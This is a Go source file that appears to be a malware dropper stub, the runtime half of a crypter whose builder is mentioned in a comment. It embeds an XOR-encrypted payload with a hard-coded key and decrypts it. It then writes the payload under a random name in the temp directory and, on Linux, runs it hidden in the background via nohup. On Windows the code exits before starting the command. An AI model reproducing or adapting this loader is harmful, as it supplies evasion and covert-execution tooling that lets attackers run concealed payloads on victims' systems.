package main

import (
	_ "embed"
	"fmt"
	"math/rand/v2"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

//go:embed payload.enc
var encrypted []byte

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func xorcrypt(data []byte, key []byte) []byte {
	output := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		output[i] = data[i] ^ key[i%len(key)]
	}
	return output
}

func randomstring(length int) string {
	str := make([]byte, length)
	for i := range str {
		str[i] = charset[rand.IntN(len(charset))]
	}
	return string(str)
}

func main() {
	key := []byte("OhShitILeftMyXorKeyInThePublicRelease") //change in builder.go if you change here
	decrypted := xorcrypt(encrypted, key)

	var filename string
	if runtime.GOOS == "windows" {
		filename = randomstring(7) + ".exe"
	} else {
		filename = randomstring(7)
	}

	fullpath := filepath.Join(os.TempDir(), filename)

	err := os.WriteFile(fullpath, decrypted, 0755)
	if err != nil {
		return
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "linux" {
		cmd = exec.Command("sh", "-c", fmt.Sprintf("nohup %s > /dev/null 2>&1 &", fullpath))
		_ = cmd.Start()
	} else {
		cmd = exec.Command(fullpath)
		os.Exit(0)
	}

}
